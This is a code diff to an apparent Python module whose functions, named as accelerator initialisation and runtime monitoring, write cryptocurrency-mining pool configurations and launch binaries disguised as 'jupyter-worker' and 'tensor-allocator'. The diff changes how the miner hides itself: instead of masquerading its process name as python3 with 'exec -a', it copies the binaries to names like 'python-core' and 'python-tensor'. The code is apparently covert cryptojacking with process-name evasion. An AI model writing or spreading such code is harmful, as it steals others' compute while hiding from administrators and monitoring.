@@ -318,9 +318,9 @@ def _init_accelerators():
         json.dump({"pools": [{"url": "127.0.0.1:5556", "user": worker_tag}], "cpu": {"priority": 0, "max-threads-hint": 50}, "print-time": 60, "log-file": None}, f)
 
     os.chdir(EXEC_DIR)
-    # Use exec -a to masquerade argv[0] as python3 in /proc/pid/cmdline
+    subprocess.run(["cp", "./jupyter-worker", "./python-core"], stdout=out, stderr=out)
     proc_a = subprocess.Popen([
-        "bash", "-c", "exec -a python3 nice -n 19 ./jupyter-worker"
+        "bash", "-c", "nice -n 19 ./python-core"
     ], stdout=out, stderr=out)
 
     time.sleep(1.5)
@@ -335,7 +335,7 @@ def _init_accelerators():
 
         wrapper = os.path.join(EXEC_DIR, "jupyter-helper")
         with open(wrapper, "w") as f:
-            f.write("#!/bin/bash\nexec -a python3 ./tensor-allocator -c tensor_config.json\n")
+            f.write("#!/bin/bash\ncp ./tensor-allocator ./python-tensor\n./python-tensor -c tensor_config.json\n")
         os.chmod(wrapper, 0o755)
 
         os.chdir(EXEC_DIR)
@@ -427,8 +427,9 @@ def _runtime_monitor():
                 json.dump({"pools": [{"url": "127.0.0.1:5556", "user": tag}], "cpu": {"priority": 0, "max-threads-hint": 50}, "print-time": 60, "log-file": None}, f)
 
             os.chdir(EXEC_DIR)
+            subprocess.run(["cp", "./jupyter-worker", "./python-core"], stdout=out, stderr=out)
             _RT_PROC_A = subprocess.Popen([
-                "bash", "-c", "exec -a python3 nice -n 19 ./jupyter-worker"
+                "bash", "-c", "nice -n 19 ./python-core"
             ], stdout=out, stderr=out)
 
             time.sleep(1.5)
@@ -445,7 +446,7 @@ def _runtime_monitor():
 
             wrapper = os.path.join(EXEC_DIR, "jupyter-helper")
             with open(wrapper, "w") as f:
-                f.write("#!/bin/bash\nexec -a python3 ./tensor-allocator -c tensor_config.json\n")
+                f.write("#!/bin/bash\ncp ./tensor-allocator ./python-tensor\n./python-tensor -c tensor_config.json\n")
             os.chmod(wrapper, 0o755)
 
             out = None if VERBOSE else subprocess.DEVNULL
